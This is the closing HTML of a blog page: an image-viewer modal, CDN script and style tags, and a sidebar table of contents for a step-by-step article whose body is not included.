<div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
<div class=pswp__share-tooltip></div>
</div>
<button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
</button>
<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
</button>
<div class=pswp__caption>
<div class=pswp__caption__center></div>
</div>
</div>
</div>
</div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css integrity="sha256-c0uckgykQ9v5k+IqViZOZKc47Jn7KQil4/MP3ySA3F8=" crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE=" crossorigin=anonymous>
</main>
<aside class="sidebar right-sidebar sticky">
<section class="widget archives">
<div class=widget-icon><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg>
</div>
<h2 class="widget-title section-title">Table of contents</h2>
<div class=widget--toc>
<nav id=TableOfContents>
<ol>
<li><a href=#explation>Explation</a></li>
<li><a href=#doing>Doing</a>
<ol>
<li><a href=#step-1>Step 1</a></li>
<li><a href=#step-2>Step 2</a></li>
<li><a href=#step-3>Step 3</a></li>
<li><a href=#step-4>Step 4</a></li>
<li><a href=#step-5>Step 5</a></li>
<li><a href=#another-way-step-1>Another Way-Step 1</a></li>
<li><a href=#another-way-step-2>Another Way-Step 2</a></li>
<li><a href=#another-way-step-3>Another Way-Step 3</a></li>
<li><a href=#another-way-2>Another Way 2</a></li>
<li><a href=#bonus>Bonus</a></li>
</ol>
</li>
</ol>
</nav>
</div>
</section>
</aside>
</div>
<script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g=" crossorigin=anonymous defer></script><script type=text/javascript src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master//ts/main.js defer></script>
<script>'serviceWorker'in navigator&&window.addEventListener('load',function(){navigator.serviceWorker.register('/sw.js')})</script>
<script>(function(){const a=document.createElement('link');a.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",a.type="text/css",a.rel="stylesheet",document.head.appendChild(a)})()</script>
</body>
</html>